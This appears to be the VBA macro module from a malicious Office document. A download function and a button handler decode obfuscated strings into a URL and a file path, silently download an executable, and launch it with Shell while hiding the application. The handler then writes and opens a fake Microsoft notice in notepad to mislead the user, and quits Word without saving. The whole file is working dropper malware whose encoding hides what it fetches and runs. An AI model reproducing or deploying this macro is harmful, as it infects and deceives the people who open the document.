Rem Attribute VBA_ModuleType=VBAFormModule
Option VBASupport 1

Function df(strURL As String, strDestination As String, _
                        Optional UserName As String = Empty, _
                        Optional Password As String = Empty) _
                        As Boolean

Const CHUNK_SIZE As Long = 1024
Const ROLLBACK As Long = 4096
On Error GoTo OhBoy
                                
                                
Dim bData() As Byte
Dim blnResume As Boolean
Dim intFile As Integer
Dim lngBytesReceived As Long
Dim lngFileLength As Long
Dim lngX
Dim lastTime As Single
Dim sglRate As Single
Dim sglTime As Single
Dim strFile As String
Dim strHeader As String
Dim strHost As String

With Inet1
    .URL = strURL
    .UserName = UserName
    .Password = Password
    .Execute , d("•š¢")
End With

While Inet1.StillExecuting
    DoEvents
    If CancelSearch Then GoTo ExitDownload
Wend

StatusLabel = "Saving:"
ToLabel = FitText(ToLabel, strDestination)
strHeader = Inet1.GetHeader
Select Case Mid(strHeader, 10, 3)
    Case "200"
    Case "206"
    Case "204"
        MsgBox "Nothing to download!", vbInformation, "No Content"
        GoTo ExitDownload
    Case "401"
        MsgBox "Authorization failed!", vbCritical, "Unauthorized"
        GoTo ExitDownload
    Case "404"
        MsgBox "The file was not found!", vbCritical, "File Not Found"
        GoTo ExitDownload
    Case vbCrLf
        MsgBox "Cannot establish connection." & vbCr & vbCr & _
               "Check your Internet connection and try again.", _
               vbExclamation, _
               "Cannot Establish Connection"
        GoTo ExitDownload
    Case Else
        strHeader = Left(strHeader, InStr(strHeader, vbCr))
        If strHeader = Empty Then strHeader = "<nothing>"
        MsgBox "The server returned the following response:" & vbCr & vbCr & _
               strHeader, _
               vbCritical, _
               "Error Downloading File"
        GoTo ExitDownload
End Select

lastTime = Timer - 1
strHeader = Inet1.GetHeader("Content-Length")
lngFileLength = Val(strHeader)
If lngFileLength = 0 Then
    GoTo ExitDownload
End If

With ProgressBar
    .Value = 0
    .Max = lngFileLength
End With

lngBytesReceived = 0


intFile = FreeFile()
Open strDestination For Binary Access Write As #intFile
If blnResume Then Seek #intFile, lngBytesReceived + 1
Do
    bData = Inet1.GetChunk(CHUNK_SIZE, icByteArray)
    Put #intFile, , bData
    If CancelSearch Then Exit Do
    lngBytesReceived = lngBytesReceived + UBound(bData, 1) + 1
    sglRate = lngBytesReceived / (Timer - lastTime)
    sglTime = (lngFileLength - lngBytesReceived) / sglRate
    TimeLabel = FormatTime(sglTime) & _
                   " (" & _
                   FormatFileSize(lngBytesReceived) & _
                   " of " & _
                   FormatFileSize(lngFileLength) & _
                   " copied)"
    RateLabel = FormatFileSize(sglRate, "###.0") & "/Sec"
    ProgressBar.Value = lngBytesReceived
    Me.Caption = d("›¾±Ç½È½»Âu¥ÄÀ¹n}±~nª¾¹¯É³u{u") & Format((lngBytesReceived / lngFileLength), "##0%") & _
                 d("n¸½Â¾Á³É³¹")
Loop While UBound(bData, 1) > 0
Close #intFile

ExitDownload:
If lngBytesReceived = lngFileLength Then
        If lngFileLength <> 0 Then
            StatusLabel = "Download completed!"
            df = True
        End If
Else
    df = False
End If

CleanUp:

If CancelSearch And Dir(strDestination) > Empty Then Kill strDestination
Exit Function
OhBoy:
MsgBox Err.Description, vbCritical, Err.Number
Unload Me
End Function

Private Sub CancelButton_Click()
Unload Me
End Sub

Public Sub startbut_Click()
Dim savas As String
savas = d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÌ½Ç²Ê¾¹€ƒ³Í³")
If Dir(d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹"), vbDirectory) <> "" Then
    RmDir d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹")
End If
MkDir d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹")
If df(d("¶ÉÂÅˆ„}·Á¹|Ê¼¾Æ¸·ÉÇƒ²º}Ç¼ÈÇÈ}ÃÃÉ|ºÆº"), savas) = True Then
    Application.Visible = False
    Shell savas, vbNormalFocus
    Open d("±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÇ³¶²Â³ƒÂÍÂ") For Output As 1
        Print #1, d("›¾±Ç½È½»Âu¤—“u“Ãµ¾¼ºv¸wu£Å²¶Âº")
        Print #1, d("{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚{‚")
        Print #1, d("¢½·ÈnÊ¾¹¯É³u·ÃÁÉ¯Áºº²uÂ½³u³ÍÂº¼¹³¹n–±É·Ë³‚¦u±Ä¼ÉÀÄºuº¾°Ç¯ÇÇu¯Ã²uÂ½³uÁÊ¾Å½ÇÂu´ÄÀuÂ½½È³ƒ")
        Print #1, d("žÁ³¶Áºn£½É³�n©¶¾ÁuÃÅ²¶Âºn¾Áu·Ãn—³É¯u¡É¯¹·Ê»�nÉ¶¶Âu»º¯ÃÁ�nÉ¶¶Âu·ÉnÂ¯În½¯Ë³u°ÊµÈ|u—»nÎ½Ên»·Ã²u¯ÃÇu°ÊµÈnÅºº¯È³u»¶·ÁnÉ¶ºnšÀÇ½Çn£ÃÂ°ºÀ�nÎ½ÊÀu‘ÊÁÉ½Â³Çnž’u¯Ã²uÇÄÃÇn¸½Â¾ÊÂºÀu·Ã´ÄÀÂ¯É·Ä¼uÂÄnÊÁƒ")
        Print #1, d("‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’‹’")
        Print #1, d("›¾±Ç½È½»Âu‘ÄÀÅ½Ç¯É·Ä¼")
        Print #1, ""
        Print #1, d("›¾±Ç½È½»Â�n«�šzu¤—“u“Ãµ¾¼ºzu�¸Â¾Äº{­n¶ÀºnÉÀ¶²º»¶ÀÀÁu½»n¢·¸ÀÄÁÄ´Én˜½Ç¾ÄÀ¶Â¾½Ã|")
    Close #1
    Shell d("¼ÄÂº¾¶²u±�ªÌ·Ã²ÄÅÈªÌ½Ç²Ê¾¹ªÇ³¶²Â³ƒÂÍÂ"), vbNormalFocus
    Application.Quit wdDoNotSaveChanges
End If
End Sub

